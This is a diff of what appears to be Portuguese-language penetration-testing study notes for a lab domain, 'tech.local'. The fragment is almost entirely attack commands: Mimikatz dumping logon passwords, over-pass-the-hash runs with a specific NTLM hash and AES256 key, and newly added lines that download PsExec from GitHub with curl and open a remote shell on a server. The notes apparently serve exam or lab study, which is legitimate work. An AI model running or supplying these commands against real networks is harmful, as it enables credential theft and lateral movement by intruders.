@@ -1247,12 +1247,17 @@ Invoke-Mimikatz
 Privilege::debug
 Sekurlsa::logonpasswords
 ```
-##### LATERAL MOVEMENT MIMIKATZ - OVER PASS THE HASH WINDOWS PARA WINDOWS (NAO FUNCIONOU)
+##### LATERAL MOVEMENT MIMIKATZ - OVER PASS THE HASH WINDOWS PARA WINDOWS (FUNCIONOU COM O PSEXEC)
 ```
 Privilege::debug
 Sekurlsa::pth /user:goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb1642743283 /run:powershell.exe
 Sekurlsa::pth /user:tech\goku /domain:tech.local /ntlm:4533aaba903fbbe1377deb1642743283 /run:powershell.exe
 Sekurlsa::pth /user:goku /domain:tech.local /aes256:e22ebc7f0546cb07424c6b261596c27440b876c01aa3af04ace01da58fdea26f /run:powershell.exe
+```
+O USUARIO SEMPRE CONTINUA O MESMO INICIAL.
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/PsExec.exe -outfile PsExec.exe
+psexec \\server01 cmd
 ```
 ##### LATERAL MOVEMENT RUBEUS - OVER PASS THE HASH WINDOWS PARA WINDOWS (FUNCIONOU LINDO)
 ```
